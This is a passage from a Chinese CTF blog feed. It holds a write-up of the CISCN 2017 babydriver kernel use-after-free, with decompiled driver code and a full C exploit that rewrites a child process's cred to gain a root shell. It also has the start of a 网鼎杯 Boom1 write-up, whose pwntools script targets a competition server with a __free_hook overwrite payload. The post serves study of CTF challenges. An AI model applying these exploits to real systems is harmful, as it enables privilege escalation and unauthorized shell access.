bytes）为下一个object的指针来实现。当有chunk被<code>kfree</code>掉时，会相应的放在对应size的<code>freelist</code>头部。至于关于object的其他的各种metadata，都会维护在相应的结构体中，这里不进行深入分析。</li><li>同glibc的<code>malloc</code>类似，<code>kmalloc</code>也不会清空chunk中的原有数据。</li></ol><h2 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h2><p>linux-4.4.72的<code>cred</code>结构体的定义如下（其中<code>atomic_t</code>，<code>kuid_t</code>，<code>kgid_t</code>都是4 bytes的数据类型）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>cred</code>结构体的作用是储存某个进程的相关信息，标志它的权限，故如果修改了进程对应的<code>cred</code>结构体，也就修改了这个进程的权限。<br><br>因此只要将进程的<code>uid</code>和<code>gid</code>改为0，就能达到提权的目的。<br><br>此外由于<code>cred</code>结构体在不同版本的kernel里，大小可能不尽相同，如果直接看源码计算它的大小可能不太方便，因此可以通过：</p><ol><li>修改文件系统镜像<code>rootfs.cpio</code>解包出的init，将setgiduid的命令，例如： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 1000 sh</span><br></pre></td></tr></table></figure> 修改为root用户: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 0 sh</span><br></pre></td></tr></table></figure> 这样内核启动完，就能以root的身份登录。</li><li>编写获取<code>cred</code>结构体大小的简单模块，打包进文件系统镜像中，如： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use for get struct cred size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">c</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_cred_size_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"[!] Start!\n"</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">"[+] Size of cred struct: %lx\n"</span>, <span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">get_cred_size_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"[!] Exit!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(get_cred_size_init);</span><br><span class="line">module_exit(get_cred_size_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br></pre></td></tr></table></figure> 这样在目标系统启动后，插入模块就能获得<code>cred</code>结构体的大小。</li></ol><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p>对于一个进程<code>fork</code>出来的子进程，由于最开始子进程会和父进程共享内存空间，只有内存中的信息要发生变化的时候，才会分配出相应的内存。因此如果父进程释放一个与<code>cred</code>结构体大小相同的chunk，子进程在创建自己的<code>cred</code>结构体的时候，会从释放的chunk中拿到内存空间，这就促使了uaf的利用。</p><h1 id="ciscn-2017-babydriver复现"><a href="#ciscn-2017-babydriver复现" class="headerlink" title="ciscn 2017 babydriver复现"></a>ciscn 2017 babydriver复现</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>查看保护机制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>同时从<code>boot.sh</code>中，查看qemu的参数，开启了smep：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p><code>ioctl</code>只提供了一个<code>kmalloc</code>的功能，为全局变量<code>babydev_struct</code>结构体的成员变量<code>device_buf</code>分配空间（事先会调用<code>kfree</code>先释放空间），其中size可控：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(babydev_struct.device_buf);</span><br><span class="line">        babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">        babydev_struct.device_buf_len = v4;</span><br><span class="line">        printk(<span class="string">"alloc done\n"</span>, <span class="number">0x24000C0</span>LL);</span><br><span class="line">        result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_2EB, v3);</span><br><span class="line">        result = <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>close</code>的回调函数<code>babyrelease</code>通过<code>kfree</code>释放了<code>babydev_struct-&gt;device_buf</code>的空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _fentry__(inode, filp);</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    printk(<span class="string">"device release\n"</span>, filp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read</code>的回调函数<code>babyread</code>读取<code>babydev_struct-&gt;device_buf</code>的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, <span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    result = <span class="number">-2L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        copy_to_user(<span class="built_in">buffer</span>, babydev_struct.device_buf, v4);</span><br><span class="line">        result = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write</code>的回调函数<code>babywrite</code>向<code>babydev_struct-&gt;device_buf</code>写入数据，size可控：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, <span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    result = <span class="number">-2L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        copy_from_user(babydev_struct.device_buf, (<span class="keyword">char</span> *)<span class="built_in">buffer</span>, v4);</span><br><span class="line">        result = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>结构体<code>babydev_struct</code>是全局变量，因此如果开启两个设备，第二个设备<code>kmalloc</code>出的<code>babydev_struct-&gt;device_buf</code>指针会会覆盖掉第一个设备的<code>babydev_struct-&gt;device_buf</code>（因为实际上是同一个）。因此如果<code>close</code>第二个设备，触发<code>kfree</code>操作释放掉<code>babydev_struct-&gt;device_buf</code>但是没有清空指针，就会造成uaf漏洞，因为此时第一个设备仍然可以操作<code>babydev_struct-&gt;device_buf</code>变量。</li><li>利用<code>ioctl</code>控制<code>babydev_struct-&gt;device_buf</code>的size为0xA8(<code>sizeof(struct cred)</code>)，使得<code>close</code>第二个设备的时候释放一个<code>size=0xC0</code>的chunk到slub中。</li><li><code>fork</code>一个子进程，由于子进程创建的<code>cred</code>结构体会从上述释放的0xC0的chunk中获得，所以第一个设备的<code>babydev_struct-&gt;device_buf</code>和子进程的<code>cred</code>同时指向一个chunk。</li><li>在子进程中调用第一个设备的<code>write</code>，将子进程的<code>cred</code>结构体中的<code>uid</code>和<code>gid</code>改为0，完成提权。</li><li>在子进程开启shell，get root shell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_MALLOC 0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd_1, fd_2;</span><br><span class="line">    <span class="keyword">int</span> child;</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">16</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// open the device twice</span></span><br><span class="line">    fd_1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    fd_2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// malloc a chunk with sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd_1, COM_MALLOC, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the chunk</span></span><br><span class="line">    <span class="built_in">close</span>(fd_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork a child process</span></span><br><span class="line">    <span class="comment">// the cred structure of the child process will take space from the chunk just freed</span></span><br><span class="line">    child = fork();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if error</span></span><br><span class="line">    <span class="keyword">if</span>(child &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Fork error!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// child process</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(child == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        <span class="built_in">write</span>(fd_2, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] Root!\n"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parent process</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>与glibc的uaf利用基本类似，只不过因为是kernel pwn，要具有多线程的思维，这点很重要，因为许多情况在单线程思维的角度中是不会发生的，但是多线程下却是可能的。</li><li>相比于调用<code>commit_creds(prepare_kernel_cred(0));</code>的函数调用的提权方式，直接修改<code>cred</code>结构体提权显得简单粗暴。</li><li>这道babydriver的题似乎还有rop绕过smep的做法，后面浮现后，会补充在上篇ROP的文章里。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.anquanke.com/post/id/201454" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201454</a></li><li><a href="https://www.anquanke.com/post/id/202371" target="_blank" rel="noopener">https://www.anquanke.com/post/id/202371</a></li><li><a href="https://www.anquanke.com/post/id/201043" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201043</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf-zh/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为课程作业里接触到了uaf的kernel pwn，虽然比较基础，但是还是有那么点基础，理解起来不会很吃力。这次复现的是CISCN 2017的一个kernel pwn babydriver，比较简单的UAF，但是还是有一些细节知识值得学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.github.io/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
      <category term="kernel" scheme="https://n0nop.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 第一场: pwn</title>
    <link href="https://n0nop.github.io/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%9C%BA-pwn/"/>
    <id>https://n0nop.github.io/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%9C%BA-pwn/</id>
    <published>2020-05-11T00:58:31.000Z</published>
    <updated>2020-05-21T14:20:03.511Z</updated>
    
    <content type="html"><![CDATA[<p>兴致满满地开始比赛，骂骂咧咧地结束比赛，这个不给libc也太难受了。全程下来只做了一个Boom1，另外两个被队里TTX大哥做了。赛后看了下Boom2，也挺简单的，但是faster0是个AutoPwn，之前的De1CTF有个code runner应该也是类似的，暂且先记录一下大佬的wp，以后学习。</p><a id="more"></a><h1 id="Boom1"><a href="#Boom1" class="headerlink" title="Boom1"></a>Boom1</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>代码略长，花了点时间逆向之后发现，其实是一个VM pwn，接受类C代码，其实从binary开始分配各种text，symbol，stack等segment可以看出来点，那个sub_B70只是存一些保留字，解析8，16，10进制数，后面应该是命令分析相关的，没有深入分析了，大概的逻辑懂了就行。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>主要是利用分配的stack segment进行操作，因为<code>malloc(0x40000)</code>，会通过<code>mmap</code>在ld的位置分配内存，所以在libc版本确定的情况下，它与libc的偏移是固定的。</li><li>由于本地试了很久没有找到正确版本的libc（不给libc简直无语），后面只能利用<code>write</code>把整个libc dump下来，方法简单来说就是手动采用类似二分法来找libc基址（标志头”\x7FELF”)，找到之后直接用<code>write(1, libc_base, xxxxxx);</code>整个dump下来，然后通过查找相应的字符串得到版本信息，拉个ld本地调试就行。 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc | grep "GLIBC"</span><br></pre></td></tr></table></figure></li><li>后续就比较简单了，通过定义局部变量，然后通过相对偏移找到<code>_IO_list_all</code>，拿到里面存的<code>_IO_2_1_stderr_</code>的地址，从而可以得到libc的基址。</li><li>同样通过相同偏移写<code>__free_hooktem</code>，然后<code>free</code>掉libc中存”/bin/sh”字符串的那块内存拿shell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'182.92.73.10'</span>, <span class="number">24573</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"int main()&#123;int a; *(&amp;a - 180998) = *(&amp;a - 181591) - 3953984 + 283536; free(*(&amp;a - 181591) - 3953984 + 1625431);&#125;"</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"I'm living...\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Boom2"><a href="#Boom2" class="headerlink" title="Boom2"></a>Boom2</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>其实跟Boom1感觉差不多，只不过不是接受输入高级语言，手撸binary中自定义的指令就行，指令格式也很简单，就是一个mem + reg的组织形式，利用方法与Boom1类似。</p><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>通过VM 